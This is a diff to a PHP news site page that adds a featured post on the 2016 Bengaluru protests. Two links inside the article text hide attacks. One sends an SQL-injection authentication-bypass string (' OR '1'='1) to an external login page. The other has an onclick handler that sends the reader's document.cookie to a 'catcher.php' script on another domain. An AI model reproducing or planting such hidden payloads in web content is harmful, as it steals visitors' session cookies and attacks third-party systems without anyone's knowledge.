@@ -5,6 +5,46 @@ include 'header.php';
     <!-- begin featured -->
     <div id="featured">
 
+
+<!-- start of post  -->
+<div class="post">
+	  
+    	  
+    <!-- headline -->    
+     <h2> <a href="/featured/20160914-bengaluru-protest.php">Bengaluru protests have cost Karnataka over Rs 25,000 crore; public transport worst-hit</a></h2>
+       
+  <p class="details">Sep 14, 2016 12:57 IST<a href="#"></a> </p>
+           <div class="thumb"><a href="#"><img src="/images/bengaluruprotest.png"  alt="bengaluruprotest" /></a></div>
+       
+<p>
+As Bengaluru hobbled back to normalcy, an <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
+271&submit=Login" target="_blank">uneasy calm </a> was still prevalent in Bengaluru’s IT city. According to reports, <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">curfew was still on in </a> a few parts of the city while the rest of Bengaluru was more or less normal. IANS, however, reported protests in Mandya and Mysuru in southern Karnataka on Tuesday.
+</p>
+
+<p class="readmore">[ <a href="/featured/20160914-bengaluru-protest.php">read more</a> ]</p>
+	          	<div class="break"></div>
+</div>  
+<!-- end of post -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <!-- start of post  -->
 <div class="post">
 	  
